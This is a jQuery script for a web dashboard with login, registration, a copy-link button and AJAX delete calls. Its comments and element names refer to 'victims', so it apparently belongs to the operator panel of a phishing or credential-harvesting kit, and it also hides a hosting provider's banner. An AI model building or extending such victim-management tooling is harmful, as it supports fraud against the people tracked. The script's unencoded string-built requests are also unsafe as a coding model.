$(window).load(function() {
    $("div[style='text-align: right;position: fixed;z-index:9999999;bottom: 0; width: 100%;cursor: pointer;line-height: 0;display:block !important;']").hide();
})
$(document).ready(function(){
	// JUST LOGIN AND JOIN VIEWS
	$("span[registerNow]").click(function(){
		$("div[login]").slideUp();
		$("div[register]").slideDown();
		$("#left_content_register").fadeOut(100);
		$("#left_content_login").fadeIn(1000);
	});
	$("span[loginNow]").click(function(){
		$("div[login]").slideDown();
		$("div[register]").slideUp();
		$("#left_content_register").fadeIn(1000);
		$("#left_content_login").fadeOut(100);
	});
	$("#btn").click(function(){
		$('#url').removeAttr('disabled');  
		$('#url').focus();
		$('#url').select();
		document.execCommand('copy');
		$('#url').attr('disabled','disabled');  
	});

	// AJAX JOIN
	$("#register").click(function(){
	    var fn = $("#fn").val();
	    var usr = $("#usr").val();
	  	var email = $("#email").val();
	  	var pass = $("#pass").val();
	  	var data = "fn="+fn+"&usr="+usr+"&email="+email+"&pass="+pass;
		$.ajax({
			url : 'xjoin.php',
			type : 'POST',
			data : data,
			success: function(response){},
			complete : function(){
				$("#successCreated").fadeIn(500);
				setTimeout(function(){ 
				$("div[login]").slideDown();
				$("div[register]").slideUp();
				$("#left_content_register").fadeIn(1000);
				$("#left_content_login").fadeOut(100);
			    }, 3000);
			}
		});
	});

	// AJAX LOGIN
	$("#login").click(function(){
		  	var email = $("#login_email").val();
		  	var pass = $("#login_pass").val();
		  	var data = "email="+email+"&pass="+pass;
			$.ajax({
				url : 'xlogin.php',
				type : 'POST',
				data : data,
				success: function(response){
					if (response == "Login Success") {
						window.location.href = "dashboard.php";
					}else{
						$("#errorLogin").fadeIn(500);
					}
				},
				complete : function(){
				}
			});
	});


	// DELETE VICTIME AJAX
	$("*#delete").click(function(){
		  	var id = $(this).attr("num");
		  	var data = "id="+id;
			$.ajax({
				url : 'xdelete.php',
				type : 'POST',
				data : data,
				success: function(response){
				},
				complete : function(){
					var vicnum = "#vic"+id;
					$(vicnum).hide();
				}
			});
	});
});